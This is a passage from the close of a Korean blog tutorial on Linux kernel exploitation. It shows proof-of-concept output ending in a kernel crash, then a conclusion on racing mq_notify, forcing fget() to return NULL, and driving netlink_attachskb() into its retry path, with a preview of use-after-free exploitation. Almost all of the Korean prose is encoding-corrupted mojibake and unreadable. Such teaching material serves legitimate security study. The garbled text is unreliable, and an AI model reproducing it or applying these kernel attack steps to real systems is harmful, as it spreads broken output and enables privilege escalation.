[+] mq_notify succeed
[ ] ready to crash?
[ ] press key to continue...

<<< KERNEL CRASH HERE >>>
```

ì´ì œë¶€í„°ëŠ”, ìµìŠ¤í”Œë¡œì‡ì´ ì™„ë²½í•´ì§ˆ ë•Œ(= ì»¤ë„ì´ ë³´ìˆ˜ë˜ì—ˆì„ ë•Œ)ê¹Œì§€ ìµìŠ¤í”Œë¡œì‡ì„ ì‹¤í–‰í•˜ê¸°ë§Œ í•˜ë©´ **ê³„ì† ì‹œìŠ¤í…œì— í¬ë˜ì‹œê°€ ë‚ ** ê²ƒì´ë‹¤. ì§œì¦ë‚˜ì§€ë§Œ ìµìˆ™í•´ì ¸ì•¼ í•œë‹¤. ë¶ˆí•„ìš”í•œ ì„œë¹„ìŠ¤(ê·¸ë˜í”½ ê´€ë ¨ ë“±)ë¥¼ ì œê±°í•˜ì—¬ ë¶€íŒ… ì‹œê°„ì„ ì¤„ì¼ ìˆ˜ë„ ìˆë‹¤. "ì§„ì§œ" íƒ€ê²Ÿì— ë§ì¶”ë ¤ë©´ ê·¸ê²ƒë“¤ì„ ë‹¤ì‹œ í™œì„±í™”ì‹œì¼œì•¼ í•œë‹¤ëŠ” ì ì„ ê¸°ì–µí•˜ì. ê·¸ëŸ° ê²ƒë“¤ì´ ì‹¤ì œë¡œ ì»¤ë„ì— ì˜í–¥ì„ ì¤€ë‹¤.

- - -

# <a name='conclusion'></a>ê²°ë¡ 

ì´ë²ˆ íŒŒíŠ¸ì—ì„  ìŠ¤ì¼€ì¥´ëŸ¬ í•˜ìœ„ ì‹œìŠ¤í…œ, task ìƒíƒœ ê·¸ë¦¬ê³  running/waiting ìƒíƒœ ì „í™˜ì´ ì–´ë–»ê²Œ ì´ë¤„ì§€ëŠ”ì§€ë¥¼ wait queueë¥¼ ì´ìš©í•˜ì—¬ ì†Œê°œí–ˆë‹¤. ì´ë¥¼ í†µí•´ ë©”ì¸ ìŠ¤ë ˆë“œë¥¼ ê¹¨ìš°ê³  race conditionì—ì„œ ì´ê¸¸(win) ìˆ˜ ìˆì—ˆë‹¤.

close()ì™€ dup() syscallì„ ì´ìš©í•œ ë°©ë²•ìœ¼ë¡œ fget()ì˜ ë‘ ë²ˆì§¸ í˜¸ì¶œì´ NULLì„ ë°˜í™˜í•˜ê²Œ í–ˆë‹¤. ë§ˆì§€ë§‰ìœ¼ë¡œ netlink\_attachskb()ì—ì„œ "retry path"ì— ì§„ì…í•˜ëŠ” ì—¬ëŸ¬ ë°©ë²•ì„ ì—°êµ¬í•˜ì—¬ netlink\_attachskb()ê°€ 1ì„ ë°˜í™˜í•˜ë„ë¡ ë§Œë“¤ì—ˆë‹¤.

ì´ ëª¨ë“  ê²ƒì„ ì´ìš©í•˜ì—¬ System Tap ì—†ì´ ë²„ê·¸ë¥¼ í™•ì‹¤í•˜ê²Œ íŠ¸ë¦¬ê±°í•˜ê³  ì»¤ë„ í¬ë˜ì‹œë¥¼ ì¼ìœ¼í‚¤ëŠ” (ìœ ì € ì˜ì—­ì˜ ì½”ë“œë§Œ ì´ìš©í•œ) proof-of-concept ì½”ë“œë¥¼ ë§Œë“¤ì—ˆë‹¤.

[ë‹¤ìŒ íŒŒíŠ¸](https://chamalane.herokuapp.com/posts/5d503601c040080004228197)ì—ì„  use-after-free ìµìŠ¤í”Œë¡œì‡ì´ë¼ëŠ” ì¤‘ìš”í•œ ì£¼ì œë¥¼ ë‹¤ë£¬ë‹¤. slab allocator, type confusion, ì¬í• ë‹¹ ê·¸ë¦¬ê³  *arbitrary call primitive*ë¥¼ ì–»ê¸° ìœ„í•´ ê·¸ê²ƒì„ ì–´ë–»ê²Œ ì‚¬ìš©í•˜ëŠ”ì§€ì— ëŒ€í•œ ê¸°ë³¸ì ì¸ ë‚´ìš©ì„ ì„¤ëª…í•  ê²ƒì´ë‹¤. ìµìŠ¤í”Œë¡œì‡ ë¹Œë“œì™€ ë””ë²„ê¹…ì— ì‚¬ìš©ë  ìƒˆ íˆ´ë“¤ë„ ë³¼ ìˆ˜ ìˆì„ ê²ƒì´ë‹¤. ë§ˆì§€ë§‰ì—” *ìš°ë¦¬ê°€ ì›í•˜ëŠ”* ì»¤ë„ íŒ¨ë‹‰ì„ ì¼ìœ¼í‚¬ ê²ƒì´ë‹¤.
